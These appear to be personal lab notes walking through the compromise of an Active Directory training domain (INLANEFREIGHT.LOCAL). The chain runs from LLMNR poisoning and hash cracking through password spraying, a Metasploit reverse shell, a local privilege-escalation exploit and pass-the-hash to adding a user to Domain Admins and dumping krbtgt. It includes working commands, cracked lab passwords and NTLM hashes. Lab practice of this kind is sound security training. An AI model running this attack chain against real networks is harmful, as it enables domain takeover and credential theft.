Connect to the internal attack host via SSH (you can also connect to it using `xfreerdp` as shown in the beginning of this module) and begin looking for a foothold into the domain.

# Enumeration
---
- `nmap -sV -T4 172.16.7.0/23 -oN nmap.out`
	- DC - `INLANEFREIGHT.LOCAL` - `172.16.7.3`

# Start with Responder
---
- `sudo responder -I ens224 -dwP -v `
- Got 'em hashes:
	- ![[Pasted image 20250817194318.png]]
- Crack 'em hashes:
	- `hashcat AB920.hash /usr/share/wordlists/rockyou.txt`
	- ![[Pasted image 20250817194517.png]]
- `AB920`:`weasal`

# Initial foothold
---
- `evil-winrm -i 172.16.7.50 -u ab920 -p weasal`
	- ![[Pasted image 20250817195149.png]]


# ==User Enumeration==
---
- Enumerate users using `crackmapexec`:
		- `crackmapexec smb 172.16.7.3 -u 'ab920' -p 'weasal' --users | awk '{print $5}' | cut -d "\\" -f 2 > final_users.txt`
- Searching for password:
	- `crackmapexec smb 172.16.7.60 -u final_users.txt -p 'Welcome1' | grep '+'`
	- ![[Pasted image 20250817220125.png]]
- `BR086`:`Welcome1`

# MSSQL Connection
---
- `impacket-mssqlclient BR086:Welcome1@172.16.7.60 -windows-auth`
	- ![[Pasted image 20250817220653.png]]
# Connecting to shares of DC
---
- `smbclient //172.16.7.3/"Department Shares" -U BR086`
- `recurse true`
- `ls`
	- ![[Pasted image 20250818013157.png]]
- `get \IT\Private\Development\web.config `
	- ![[Pasted image 20250818013240.png]]
- `netdb`:`D@ta_bAse_adm1n!`
- `impacket-mssqlclient netdb:'D@ta_bAse_adm1n!'@172.16.7.60`
- ![[Pasted image 20250818013605.png]]

# Foothold on SQL01
---
- We can execute `xp_cmdshell` with `netdb` user
- Spawn `web_delivery` shell with meterpreter:
	- ![[Pasted image 20250818014035.png]]
	- ![[Pasted image 20250818014042.png]]
# Exploit Suggester
---
- We can use `local_exploit_suggester` python script OR from metasploit:
	- ![[Pasted image 20250818024454.png]]
- Trying PrinterDemon:
	- `use exploit/windows/local/cve_2020_1337_printerdemon`
	- `set payload windows/x64/meterpreter/reverse_tcp`
	- `set SESSION 1`
		- Set other options
	- `run`
	- ![[Pasted image 20250818024537.png]]
	- ![[Pasted image 20250818024543.png]]
- We can also GET SYSTEM:
	- ![[Pasted image 20250818024956.png]]
- `sudo bloodhound-python -u 'BR086' -p 'weasal' -ns 172.16.7.3 -d inlanefreight.local -c all `

# More Enumeration
---
- `list_tokens -u`
	- This shows `INLANEFREIGHT.LOCAL/SQLSVC` as another user
	- We impersonate this
	- ![[Pasted image 20250818050132.png]]
- Running Sharphound:
	- `.\SharpHound.exe -c All --zipfilename ILFREIGHT`
	- ![[Pasted image 20250818050147.png]]
- This user is under a Special Group:
	- ![[Pasted image 20250818050422.png]]
- As administrator user, dump LSASSY (memory credentials):
	- `crackmapexec smb 172.16.7.60 -u Administrator -H 136b3ddfbb62cb02e53a8f661248f364 --local-auth -M lsassy`
		- OR
	- `secretsdump.py -hashes :136b3ddfbb62cb02e53a8f661248f364 Administrator@172.16.7.60`
	- ![[Pasted image 20250818055748.png]]
- Check the access:
	- `crackmapexec smb 172.16.7.0/23 -u mssqlsvc -H 8c9555327d95f815987c0d81238c7660`
	- ![[Pasted image 20250818060006.png]]
- ![[Pasted image 20250818060104.png]]
# Domain Compromise
---
- We do LLMNR poisoning attack on Windows hosts now.
- Transfer `inveigh.ps1` on `MS01`
- Pivot using `sshuttle` as we need RDP to work (inveigh won't work without proper GUI).
- Run this with `evil-winrm` on `MS01` to disable RDP security:
	- `reg add HKLM\System\CuntControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d  /f`
- ![[Pasted image 20250818073548.png]]
- RDP into `MS01` and run `inveigh.ps1`:
	- `xfreerdp3 /v:172.16.7.50 /u:'mssqlsvc' /pth:'8c9555327d95f815987c0d81238c7660'`
	- `Import-Module .\Inveigh.ps1`
	- `Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y`
- New hash obtained:
	- ![[Pasted image 20250818073649.png]]
- Crack it:
	- `hashcat CT059.hash /usr/share/wordlists/rockyou.txt `
	- ![[Pasted image 20250818073834.png]]
- `CT059`: `charlie1`
- Get shell as `CT059`:
	- `runas /user:INLANEFREIGHT.LOCAL\CT059 cmd.exe`
	- ![[Pasted image 20250818075146.png]]
	- **Add current user to domain admins** (since this user has **Generic All over Domain Admins** group ):
		- `net group "Domain Admins" CT059 /add /domain`
		- ![[Pasted image 20250818075601.png]]
	- Login to **Domain Controller**:
		- `evil-winrm -u CT059 -p charlie1 -i 172.16.7.3`
		- ![[Pasted image 20250818075734.png]]
	- `secretsdump.py CT059:charlie1@172.16.7.3 -just-dc-user krbtgt`
	- ![[Pasted image 20250818075934.png]]